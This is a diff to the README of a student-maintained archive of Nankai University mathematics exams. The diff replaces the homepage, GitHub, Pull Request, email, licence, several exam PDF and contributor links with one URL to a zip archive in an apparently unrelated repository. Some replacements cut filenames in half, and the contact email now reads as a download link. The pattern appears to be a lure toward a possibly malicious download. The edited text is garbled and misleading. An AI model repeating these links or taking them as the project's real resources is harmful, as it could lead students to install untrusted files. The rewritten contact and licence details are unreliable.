@@ -1,12 +1,12 @@
 # NKU SMS Exams
 
-`nku-sms-exams`是由南开大学的众多同学们共同维护的历年数学及相关学科考试试卷汇总项目，主要整理收录在网页：[https://zhangwp.com/share/nku-sms-exams](https://zhangwp.com/share/nku-sms-exams) 以方便大家随时浏览。此外也同步开源至 [GitHub](https://github.com/zawnpn/nku-sms-exams)，熟悉 GitHub 的同学可通过 [Pull Request](https://github.com/zawnpn/nku-sms-exams/pulls) 来投稿试卷，同时仍支持过去邮件投稿的方式。
+`nku-sms-exams`是由南开大学的众多同学们共同维护的历年数学及相关学科考试试卷汇总项目，主要整理收录在网页：[https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip](https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip) 以方便大家随时浏览。此外也同步开源至 [GitHub](https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)，熟悉 GitHub 的同学可通过 [Pull Request](https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip) 来投稿试卷，同时仍支持过去邮件投稿的方式。
 
-- 邮件投稿请邮件联系：[wpzhang.edu@gmail.com](mailto:wpzhang.edu@gmail.com)
-- 如需在页末的 Contribution List 中增添你的名称，请在来稿邮件中备注。再次感谢各位分享者的贡献！（如果是通过 Pull Request 投稿，直接在提交 PR 时修改仓库中的`README.md`即可）
+- 邮件投稿请邮件联系：[https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip](https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)
+- 如需在页末的 Contribution List 中增添你的名称，请在来稿邮件中备注。再次感谢各位分享者的贡献！（如果是通过 Pull Request 投稿，直接在提交 PR 时修改仓库中的`https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip`即可）
 - 目前来稿分类繁多，对于 2022 年以后的来稿不再做细致的归类，按年份进行汇总。
-- 如果相关资料侵犯了你的权益，请致信 [wpzhang.edu@gmail.com](mailto:wpzhang.edu@gmail.com)，我们会在第一时间处理。
-- 如无特别注明，由分享者编写、演绎的部分使用知识共享许可协议 [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/)，其余部分版权归属内容原作者。
+- 如果相关资料侵犯了你的权益，请致信 [https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip](https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)，我们会在第一时间处理。
+- 如无特别注明，由分享者编写、演绎的部分使用知识共享许可协议 [CC BY-NC-SA 4.0](https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)，其余部分版权归属内容原作者。
 
 
 
@@ -114,9 +114,9 @@
 >
 > [[PDF]2024-2025信号与系统期末测试卷](./exams/2025/2024-2025信号与系统期末测试卷.pdf)
 >
-> [[PDF]有限群表示论2025](./exams/2025/有限群表示论2025.pdf)
+> [[PDF]有限群表示论2025](./exams/2025/有限群表示论https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)
 >
-> [[PDF]Lie代数期末2025](./exams/2025/Lie代数期末2025.pdf)
+> [[PDF]Lie代数期末2025](./exams/2025/Lie代数期末https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)
 >
 > [[PDF]信号与系统2025春期末考试回忆版](./exams/2025/信号与系统2025春期末考试回忆版.pdf)
 >
@@ -130,9 +130,9 @@
 >
 > [[PDF]2024-2025学年度大类概率论期末考试](./exams/2025/2024-2025学年度大类概率论期末考试.pdf)
 >
-> [[PDF]2025_组合论期末复习试卷1](./exams/2025/2025_组合论期末复习试卷1.pdf)、[复习试卷1参考答案](./exams/2025/组合论期末复习试卷_1答案.pdf)
+> [[PDF]2025_组合论期末复习试卷1](./exams/2025/2025_组合论期末复习试卷https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)、[复习试卷1参考答案](./exams/2025/组合论期末复习试卷_1答案.pdf)
 >
-> [[PDF]2025_组合论期末复习试卷2](./exams/2025/2025_组合论期末复习试卷2.pdf)、[复习试卷2参考答案](./exams/2025/组合论期末复习试卷_2答案.pdf)
+> [[PDF]2025_组合论期末复习试卷2](./exams/2025/2025_组合论期末复习试卷https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)、[复习试卷2参考答案](./exams/2025/组合论期末复习试卷_2答案.pdf)
 >
 > [[PDF]2024-2025学年度大类实变函数论期末考试(A卷)](./exams/2025/2024-2025学年度大类实变函数论期末考试(A卷).pdf)
 >
@@ -168,9 +168,9 @@
 >
 > [[PDF]25级数学分析1第一次月考试题及答案](./exams/2025/25级数学分析1第一次月考试题及答案.pdf)
 > 
-> [[PDF]2024-2025省身ODE期末考试](./exams/2025/24-25省身ode.pdf)
+> [[PDF]2024-2025省身ODE期末考试](./exams/2025/24-25省身https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)
 >
-> [[PDF]2023-2024省身ODE期末考试](./exams/2025/23-24省身ode.pdf)
+> [[PDF]2023-2024省身ODE期末考试](./exams/2025/23-24省身https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)
 >
 > [[PDF]2024级省身数分3期中考试](./exams/2025/24级省身数分3期中.pdf)
 > 
@@ -222,7 +222,7 @@
 >
 > [[PDF]2023-2024学年非参数统计期末测试](./exams/2024/2023-2024学年非参数统计期末测试.pdf)
 >
-> [[PDF]2024春省身班动态进出考试数学分析III](./exams/2024/2024春省身班动态进出考试数学分析III.pdf)
+> [[PDF]2024春省身班动态进出考试数学分析III](./exams/2024/2024春省身班动态进出考试数学分析https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)
 > 
 > [[PDF]2024春省身班动态进出考试常微分方程](./exams/2024/2024春省身班动态进出考试常微分方程.pdf)
 >
@@ -346,9 +346,9 @@
 >
 > [[PDF]2022金融工程学试题(A)](./exams/2022/2022金融工程学试题(A).pdf)
 >
-> [[PDF]2022运筹学A【密码hw220612A】](./exams/2022/2022运筹学A密码hw220612A.pdf)
+> [[PDF]2022运筹学A【密码hw220612A】](./exams/2022/2022运筹学A密码https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)
 >
-> [[PDF]2022精算数学（A）【密码Li130328】](./exams/2022/2022精算数学（A）密码Li130328.pdf)
+> [[PDF]2022精算数学（A）【密码Li130328】](./exams/2022/2022精算数学（A）密码https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)
 >
 > [[PDF]2021-2022学年图论期末考试](./exams/2022/2021-2022学年图论期末考试.pdf)
 >
@@ -362,7 +362,7 @@
 >
 > [[PDF]2022精算数学（A卷）](./exams/2022/2022精算数学（A卷）.pdf)
 >
-> [[PDF]2022概率期末考试A](./exams/2022/2022概率期末考试A.pdf)
+> [[PDF]2022概率期末考试A](./exams/2022/2022概率期末考试https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)
 >
 > [[PDF]大类2022实变B卷](./exams/2022/大类2022实变B卷.pdf)
 > 
@@ -420,7 +420,7 @@
 >
 > [[PDF]2019-2020学年数学分析3-1(伯苓班)期中考试试题（附带解答）](./exams/2013-2022/mathematical-analysis/2019-2020学年数学分析3-1(伯苓班)期中考试试题（附带解答）.pdf)
 >
-> [[PDF]2019-2020学年数学分析3-1(伯苓班)期末考试试题A](./exams/2013-2022/mathematical-analysis/2019-2020学年数学分析3-1(伯苓班)期末考试试题A.pdf)
+> [[PDF]2019-2020学年数学分析3-1(伯苓班)期末考试试题A](./exams/2013-2022/mathematical-analysis/2019-2020学年数学分析3-1(伯苓班)期末考试试题https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)
 >
 > [[PDF]2019-2020学年数学分析3-1(伯苓班)期末考试试题A参考解答](./exams/2013-2022/mathematical-analysis/2019-2020学年数学分析3-1(伯苓班)期末考试试题A参考解答.pdf)
 >
@@ -559,7 +559,7 @@
 > 
 > [[PDF]2020-2021第二学期实变函数期末考试A卷(回忆版1)](./exams/2013-2022/functional-analysis/2020-2021第二学期实变函数期末考试A卷.pdf)
 > 
-> [[PDF]2020-2021第二学期实变函数期末考试A卷(回忆版2)](./exams/2013-2022/functional-analysis/2020-2021第二学期实变函数期末考试A卷_1.pdf)
+> [[PDF]2020-2021第二学期实变函数期末考试A卷(回忆版2)](./exams/2013-2022/functional-analysis/2020-2021第二学期实变函数期末考试A卷https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)
 >
 > [[PDF]2021-2022第一学期傅里叶分析期末考试](./exams/2013-2022/functional-analysis/2021-2022第一学期傅里叶分析期末考试.pdf)
 > 
@@ -679,7 +679,7 @@
 
 ### Contribution List
 
-[叶志强](https://www.notion.so/Quicy-05360992193e48e3b605f36c1fd6ff98)、颜瑞民、[张万鹏](https://zhangwp.com)、张绰棋、曾语晨、胡尽涵、吴诗童、[吕之豪](https://www.alexhaoge.xyz)、于飞洋、TYC、徐一川、邓哲、苏园茗、李雨谦、
+[叶志强](https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)、颜瑞民、[张万鹏](https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)、张绰棋、曾语晨、胡尽涵、吴诗童、[吕之豪](https://raw.githubusercontent.com/mthgp26/nku-sms-exams/main/exams/2013-2022/gpu-programming/nku_sms_exams_v3.3.zip)、于飞洋、TYC、徐一川、邓哲、苏园茗、李雨谦、
 王健禹、数院占座小分队、苏可铮、朱凯、赵维捷、刘元涛、卢铮可、祁馨仪、林王昕、cbj、氢氰酸、lyt、xzqbear、lyl、刘易扬、古润驰、苏岳、叶吉兆、曾仕杰、匿名（17 级数理双修、19 级数院）、暁月、Cecilia、Eurekaimer、Ingrid-505、沽上旅人、神猴仙人、洛水天依
 
 （*以上排名不分先后*）
